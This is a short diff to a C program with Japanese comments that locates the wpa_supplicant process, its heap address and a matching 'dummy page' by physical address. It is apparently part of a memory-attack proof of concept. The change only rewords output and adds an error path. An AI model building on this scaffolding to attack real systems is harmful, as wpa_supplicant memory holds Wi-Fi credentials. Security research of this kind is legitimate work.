@@ -49,7 +49,7 @@ int main() {
 
     // wpa_supplicant のプロセスID取得
     int pid = get_process_id();
-    printf("[+] pid = %d\n", pid);
+    printf("[+] PID of wpa_supplicant: %d\n", pid);
 
     // wpa_supplicant プロセスの heap 領域のアドレスを取得
     uint64_t heap_addr = get_heap_start_address(pid);
@@ -66,10 +66,11 @@ int main() {
     for (int index = 0; index < DUMMY_PAGE; index++) {
         if (dummy_pages[index].phys_addr == phys_addr) {
             printf("[+] dummy page is %d\n", DUMMY_PAGE - index - 1);
-            break;
+            return 0;
         }
     }
-    
-    return 0;
+
+    puts("[-] failed to calculate dummy page");
+    return 1;
 }
 
